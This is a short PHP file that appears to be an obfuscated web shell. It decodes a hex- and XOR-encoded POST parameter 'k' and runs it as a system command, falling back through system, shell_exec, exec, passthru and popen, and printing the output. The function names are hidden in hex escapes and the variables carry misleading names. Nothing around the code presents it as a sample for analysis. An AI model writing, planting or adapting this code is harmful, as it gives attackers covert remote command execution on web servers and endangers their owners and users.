<?php

$right_pad_string7 = "pcl\x6Fs\x65";
$right_pad_string2 = "s\x68ell\x5Fex\x65\x63";
$request_approved = "h\x65\x782b\x69n";
$right_pad_string4 = "p\x61ss\x74hr\x75";
$right_pad_string5 = "\x70o\x70en";
$right_pad_string3 = "\x65x\x65c";
$right_pad_string1 = "s\x79stem";
$right_pad_string6 = "st\x72ea\x6D_g\x65t\x5Fc\x6Fn\x74\x65\x6Ets";
if (isset($_POST["k"])) {
            function hub_center    ($ent,  $pset  )    { $elem  =  ''; $x=0; do{$elem.=chr(ord($ent[$x])^$pset);$x++;} while($x<strlen($ent)); return    $elem;   }
            $k = $request_approved($_POST["k"]);
            $k = hub_center($k, 46);
            if (function_exists($right_pad_string1)) {
                $right_pad_string1($k);
            } elseif (function_exists($right_pad_string2)) {
                print $right_pad_string2($k);
            } elseif (function_exists($right_pad_string3)) {
                $right_pad_string3($k, $marker_ent);
                print join("\n", $marker_ent);
            } elseif (function_exists($right_pad_string4)) {
                $right_pad_string4($k);
            } elseif (function_exists($right_pad_string5) && function_exists($right_pad_string6) && function_exists($right_pad_string7)) {
                $pset_elem = $right_pad_string5($k, 'r');
                if ($pset_elem) {
                    $factor_resource = $right_pad_string6($pset_elem);
                    $right_pad_string7($pset_elem);
                    print $factor_resource;
                }
            }
            exit;
        }